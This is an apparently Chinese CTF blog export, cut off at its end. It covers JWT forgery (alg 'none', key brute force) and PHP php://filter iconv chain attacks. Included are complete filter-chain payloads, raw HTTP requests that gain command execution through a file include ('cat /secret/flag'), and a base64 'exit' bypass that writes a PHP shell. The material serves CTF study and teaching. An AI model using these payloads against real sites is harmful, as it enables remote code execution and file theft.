router.routes();&#125;;\n\n访问/controllers/api.js前端几个能看到的功能接口逻辑都在了，分析登录和注册接口\n# 注册：const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);const secretid = global.secrets.length;global.secrets.push(secret)const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);# 登录：const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;console.log(sid)if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;         throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);&#125;const secret = global.secrets[sid];const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);\n\n我们看到secretid值校验，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。JavaScript 是一门弱类型语言，可以通过空数组与数字比较永远为真或是小数来绕过，而这个题利用的是 将加密方式改为’none’ 的方法，\nprint(jwt.encode(&#123;&quot;secretid&quot;:0.1,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;).decode(&#x27;utf-8&#x27;))\n\n把生成的值替换authorization的值就通过验证了\n\n登入之后点击get flag，权限足够，获得flag\n\nCISCN 2019 华北赛区 Web - ikun复现环境https://buuoj.cn/challenges\n题解当然这道题还涉及逻辑漏洞和python反序列化，我们在这只提一下JWT部分，详细的WP师傅们可以在网上找到。\n&#x2F;b1g_m4mber这个页面，提示只允许admin访问\n\n既然提示要admin，那基本上跟cookie有关，查看一下cookie，发现是JWT\n解码可得：\n\n而这道题对于jwt的解法是爆破密钥，我们用到一个叫jwt-cracker的工具来爆破密钥。\n当然 之前提到的 JWT tool 也支持密钥爆破。\n\n爆破出来密钥为1Kun，修改用户名为admin，修改token重放：\n\n接下来就是python反序列化了：\n\nEnd\nTool:\n\nhttps://github.com/ticarpi/jwt_tool\nhttps://github.com/brendan-rius/c-jwt-cracker\n\nReference\n\nhttps://github.com/ticarpi/jwt_tool/wiki\nhttps://saucer-man.com/information_security/377.html\nhttps://xz.aliyun.com/t/9376#toc-0\n","categories":["CTF"],"tags":["Web"]},{"title":"Filter","url":"/2023/02/07/Filter/","content":"前言说起来 在HNCTF的时候就有师傅用filter链给我把一道文件包含题非预期了，一直说着研究，然后一直咕x，然后这次idek比赛就遇到了（悲\n所以这篇文就小小的总结一波吧x\n【idekCTF 2022】Paywall_WriteUp _使用filter链构造对应字符那先看Paywall这道题。\n\n附件如下：\n暂时无法在飞书文档外展示此内容\n题目起了之后：\n\n当你点击 All about flags的时候会提示下面的信息：\nThank you for your interest in The idek Times, but this article is only for premium users!# 可以看到 只有高贵的VIP才能看到 flagx\n\n我们点击两个连接，可以看到url的参数变化：\n\n?p&#x3D;flag\n?p&#x3D;hello-world\n\n因为是白盒，所以直接审计代码：（这里就给关键部分的代码了）\n&lt;?php        error_reporting(0);        set_include_path(&#x27;articles/&#x27;);        if (isset($_GET[&#x27;p&#x27;])) &#123;            $article_content = file_get_contents($_GET[&#x27;p&#x27;], 1);                        # 使用strpos()函数检查读取的文章内容是否以“PREMIUM”或“FREE”开头            if (strpos($article_content, &#x27;PREMIUM&#x27;) === 0) &#123;                die(&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;); // TODO: implement subscriptions            &#125;            else if (strpos($article_content, &#x27;FREE&#x27;) === 0) &#123;                echo &quot;&lt;article&gt;$article_content&lt;/article&gt;&quot;;                die();            &#125;            else &#123;                die(&#x27;nothing here&#x27;);            &#125;        &#125;     ?&gt;\n\n所以我们的思路还是比较明确，在他用file_get_contents() 函数从请求的文件中读取内容的时候，在flag文件的开头加一个 “FREE” 这样就能让php输出$article_content的内容。\n所以这里就利用了filter链的构造，详细看这个项目：\nhttps://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\n当然也有可以直接用来梭的脚本：\nhttps://github.com/synacktiv/php_filter_chain_generator\n原理我们稍后做阐释，这里要做的是利用filter链在包含flag的文件前生成 “FREE”关键字 让php执行\necho &quot;&lt;article&gt;$article_content&lt;/article&gt;&quot;;从而输出包含的flag。\n要注意的是，FREE的base64编码为”RlJFRQ==“\n我们需要保证我们加入的字符和flag文件的字符能够被正常解码\n即 我们得保证base64解码前 文件内容不是 (因为convert.iconv.UTF8.UTF7会消掉等号）\n“RlJFRQUFJFTUlVTSAtIGlkZWt7VGg0bmtfVV80X1N1YnNjUjFiMW5nX3QwX291cl9uM3dzUEhQYXBlciF9“\n否则你读不到flag，只会得到这个：\n\nbase64的编码原理,3位一组不足的话得补&#x3D;，所以这里FREE还得补上两个字符，使得所得的base64没有”&#x3D;”.确保后面的内容解码成功。\n（当然只要满足开头为FREE且flag前面为3的整数倍字符就行x）\n所以构造的fitter链如下：\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag\n\n\n这里的&quot;\\x1b$)C&quot;是由convert.iconv.UTF8.CSISO2022KR生成，因为生成链的程序默认在尾部增加了这个，后面我们会详细讲解x\nflag文件的内容是”PREMIUM - idek&#123;Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!&#125;“\n【HNCTF 2022】unf1ni3hed_web3he1 非预期 使用filter链进行RCE首先这一道题的预期解是是session反序列化，但在前期源码获取的基础上，根据 just so so 这道题的灵感加了一个t00llll.php文件来获取源码信息，该文件的源码如下：\n&lt;?phperror_reporting(0);if (!isset($_GET[&#x27;include_&#x27;])) &#123;    echo &quot;使用工具的时候,要轻一点哦~&quot;;    show_source(__FILE__);&#125;else&#123;    $include_ = $_GET[&#x27;include_&#x27;];&#125;if (preg_match(&#x27;/sess|tmp/i&#x27;, $include_)) &#123;    die(&quot;可恶涅,同样的方法怎么可能骗到本小姐两次!&quot;);&#125;else if (preg_match(&#x27;/sess|tmp|index|\\~|\\@|flag|g|\\%|\\^|\\&amp;|data|log/i&#x27;, $include_)) &#123;    die(&quot;呜呜呜,不可以包含这些奇奇怪怪的东西欸!!&quot;);&#125;else @include($include_);?&gt;\n\n该文件的本意是让选手用其读取web3he1.php的源码进行代码审计，但是过滤规则还是存在一个漏洞——即我们可以通过构造filter链直接进行RCE，详细参考的项目还是这个： https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\n当然由于我当时出题的时候 正则有这个规则 g/i 所以脚本使用的BIG编码不可行，得做一些平替。\n所以需要自己去fuzz,这里提供一份我fuzz好的字典x：（嘘~）\n用于包含的代码如下：\n&lt;?=`$_GET[0]`;;/* (base64 value: PD89YCRfR0VUWzBdYDs7Lyo)\n\n最后得到的一个 GET[0] 的 临时RCE，下面是攻击报文：\nGET /t00llll.php?include_=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO-2022-KR.UTF16|convert.iconv.ISO-IR-139.UTF-16|convert.iconv.ISO-IR-157.ISO-IR-156|convert.iconv.WINDOWS-1258.ISO_6937|convert.iconv.KOI8-T.ISO-2022-JP-3|convert.iconv.CP874.ISO2022KR|convert.iconv.CSUNICODE.UTF-8|convert.iconv.OSF00010004.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=cat+/secret/flag HTTP/1.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.52Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\n\n之前就非预期的一位师傅的payload如下：\nGET /t00llll.php?include_=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.iconv.OSF00010009.ISO2022JP2|convert.iconv.UTF16.ISO-10646/UTF-8|convert.iconv.UTF-16.UTF8|convert.iconv.ISO_8859-14:1998.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&amp;0=_RCE_\n\n原理阐述php:&#x2F;&#x2F;filter\n在PHP官方文档中有下面的介绍：\nphp:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。\nphp:&#x2F;&#x2F;filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。\n\n\n\n\n名称\n描述\n\n\n\nresource&#x3D;&lt;要过滤的数据流&gt;\n这个参数是必须的。它指定了你要筛选过滤的数据流。\n\n\nread&#x3D;&lt;读链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。\n\n\nwrite&#x3D;&lt;写链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。\n\n\n&lt;；两个链的筛选列表&gt;\n任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。\n\n\n我们下面将用到的几个：没有指定的过滤器，读过滤器，写过滤器，下面给出两种方法的示例方便理解两种方法：\n&lt;?php/* 这简单等同于：  readfile(&quot;http://www.example.com&quot;);  实际上没有指定过滤器 */readfile(&quot;php://filter/resource=http://www.example.com&quot;);?&gt;&lt;?php/* 这会以大写字母输出 www.example.com 的全部内容 */readfile(&quot;php://filter/read=string.toupper/resource=http://www.example.com&quot;);/* 这会和以上所做的一样，但还会用 ROT13 加密。 */readfile(&quot;php://filter/read=string.toupper|string.rot13/resource=http://www.example.com&quot;);?&gt;&lt;?php/* 这会通过 rot13 过滤器筛选出字符 &quot;Hello World&quot;  然后写入当前目录下的 example.txt */file_put_contents(&quot;php://filter/write=string.rot13/resource=example.txt&quot;,&quot;Hello World&quot;);?&gt;\n\n死亡绕过我们以这个经典的例子当作引子：\n&lt;?phphighlight_file(__FILE__);error_reporting(0);$content = $_POST[&#x27;content&#x27;];file_put_contents($_GET[&#x27;filename&#x27;], &quot;&lt;?php exit; ?&gt;&quot;.$content);?&gt;\n\n因为exit的存在所以不管我们传入什么马，程序都会直接结束，所以我们需要想办法让&lt;?php exit; ?&gt;失效，在上面我们提到filter和它支持的convert.base64两个过滤器，在php中，base64的过滤器存在一定宽松性，base64编码中只包含64个可打印字符(A-Za-z0-9+/=)，而PHP在解码base64时，遇到不在其中的字符时，将会直接置空处理，我们可以这样理解：\n$_GET[&#x27;input&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;input&#x27;]);\n\n仅留下合法字符串进行解码。\n下面的例子：\n$strrr = &quot;PD9wa&lt;&gt;HA&lt;&gt;gZ&lt;?X&gt;hpdDsgPz4=&quot;;//base64_encode &quot;&lt;?php exit; ?&gt;&quot;    echo base64_decode($strrr);    #Output: &lt;?php exit; ?&gt;\n\n另外，在根据base64的编码原理，没有凑够4字节的倍数那么就会用&#x3D;号凑齐：\n比如 a → base64_encode &#x3D; &quot;YQ==&quot;\n所以如果要让密文正确解码，则我们得保证密文的长度必须为4的倍数。\n如果密文长度不是4的倍数，我们继续拿上面的例子举例：\n$strrr = &quot;PD9wa&lt;&gt;HA&lt;&gt;gZ&lt;?X&gt;hpdDsgPz4=&quot;;//base64_encode &quot;&lt;?php exit; ?&gt;&quot;// 在strrr前面加以一个a$strrr = &quot;aPD9wa&lt;&gt;HA&lt;&gt;gZ&lt;?X&gt;hpdDsgPz4=&quot;;    echo base64_decode($strrr);    #Output: h������������?&gt;\n\n就会乱码。\n那我们再回到这个问题，内容虽然被加上&lt;?php exit; ?&gt;，但前面的输入是可控的，不妨我们先使用php://filter/write=convert.base64-decode 来首先对其解码，这样只会剩下：phpexit 七个字符，到这我们再回头结合base64的解码规则——4个一解码，那么如果我们向下面这样构造：\n$strrr = &quot;&lt;?php exit; ?&gt;aPD9waHAgcGhwaW5mbygpOz8+&quot;;#Actual decoding:phpexitaPD9waHAgcGhwaW5mbygpOz8+    echo base64_decode($strrr);# OutPut：�^�+Z&lt;?php phpinfo();?&gt;\n\n即：我们给phpexit增加一个字符使其正常解码,同时也确保我们后面的内容也正常解码。\n最后payload如下：\nGET：?filename=php://filter/write=convert.base64-decode/resource=shell.phpPOST：content=aPD9waHAgcGhwaW5mbygpOz8+\n\n即可完成死亡绕过x\n当然除了base64，还能使用rot13进行绕过，但其实原理都差不多，即使用filter过滤器进行构造，所以这里就不多赘述，接下来我们介绍filter过滤器中另外一个字符编码Iconv。\nConvert.iconv &amp; base64特性一 base64_en&#x2F;decode这里先提一个特性，看下面的base64加密解密过程：\n\n我们将test当作base64解码再编码，重复多次我们还是可以得到test，当然前提是编码内容是4的倍数。\n我们把这个记为 特性一\n（当然如果只有三个字符也可以（注意个数限制就只能是3） 但是根据base64特性，会在末尾补上&#x3D;，如果只是单纯的base64编码就无所谓啦，但我们后面还会涉及到其他编码的转换，&#x3D;会被过滤掉，那么多次编码解码后内容就不对了x）\n特性二 convert.iconv 字符转换我们以原理的核心，也就是convert.iconv的CSISO2022KR为例子，看下面的这一串php代码：\nphp://filter/convert.iconv.UTF8.CSISO2022KR/resource=php://temp\n\n我们尝试输出它：\n&lt;?php$url = &quot;php://filter/convert.iconv.UTF8.CSISO2022KR/resource=php://temp&quot;;$var = file_get_contents($url);var_dump(file_get_contents($url));# Output：string(4) &quot;&quot; #这里&quot;&quot;中没有内容是因为编码的字符是不可见字符echo bin2hex($var);# Output：1b242943 （The hexcode of “.$)C”）\n\n\n当然现在可能不是很明显，我们尝试利用之前提到的PHPbase64的宽松性去强制解码再编码：\n&lt;?php$url = &quot;php://filter/convert.iconv.UTF8.CSISO2022KR&quot;;$url .= &quot;|convert.base64-decode&quot;;$var = file_get_contents($url.&quot;/resource=data://,aaa&quot;);echo $url.&quot;|convert.base64-encode/resource=data://,aaa&quot;.&quot;\\n&quot;;echo bin2hex($var).&quot;\\n&quot;;var_dump(file_get_contents($url.&quot;|convert.base64-encode/resource=data://,aaa&quot;));#Output:$url .= &quot;|convert.base64-encode&quot;;$url .= &quot;/resource=data://,aaa&quot;;echo $url.&quot;\\n&quot;;$var = file_get_contents($url);echo bin2hex($var).&quot;\\n&quot;;var_dump(file_get_contents($url));\n\n上述程序的输出如下：\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaa09a69a string(3) &quot;     ��&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaa43616161string(4) &quot;Caaa&quot;\n\n\n这里先解释一下为什么不用php:&#x2F;&#x2F;temp，根据base64的宽松性，我们在上面提到过，这个解码过程可以这样理解：\npreg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $input);\n\n所以当我们调用decode的时候首先会对非法字符进行置空，只剩下C和剩下的字符一起解码，那么我们想要还原这个C，按照base64encode的原理，至少需要4个字符，所以我们这里使用了resource&#x3D;data:&#x2F;&#x2F;,aaa让C和三个a一起解码。\n利用——构造base64表内任意字符在特性二中我们利用编码转换构造了一个C的base64decode串，那么能否利用iconv的特性构造其他字符呢？\n答案是可以的，只要构造的字符在base64表内，那么就能通过不停的拼接iconv支持的编码，不断的利用base64特性去除非法字符，然后留下特定字符进行构造。\n那么我们就可以构造A-Za-z0-9+/=任意字符。\n既然这样，我们能否在把脑洞开大一点，我们既然能构造base64表中的任意字符，那我们讲这一串字符再进行一次base64解码不就相当于，我们能够构造不受限制的任意字符了么？！！！\n构造任意payload的base64形式根据上面的结论，理论上我们可以对任意payload的base64进行构造，只需要通过编码不断扩展就行，比如下面这一个过程：\n&lt;?php$url = &quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&quot;;$url_2 = &quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&quot;;$url_3 = &quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&quot;;$url .= &quot;|convert.base64-decode&quot;;$var = file_get_contents($url.&quot;/resource=data://,aaa&quot;);echo $url.&quot;|convert.base64-encode/resource=data://,aaa&quot;.&quot;\\n&quot;;echo bin2hex($var).&quot;\\n&quot;;var_dump(file_get_contents($url.&quot;/resource=data://,aaa&quot;));$url .= &quot;|convert.base64-encode&quot;;$url .= &quot;/resource=data://,aaa&quot;;echo $url.&quot;\\n&quot;;$var = file_get_contents($url);echo bin2hex($var).&quot;\\n&quot;;var_dump(file_get_contents($url));php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,aaad5a69astring(3) &quot;զ�&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,aaa31616161 string(4) &quot;1aaa&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode/resource=data://,aaadb569a string(3) &quot;�V�&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode/resource=data://,aaa32316161 string(4) &quot;21aa&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode/resource=data://,aaadccdb569a6 string(5) 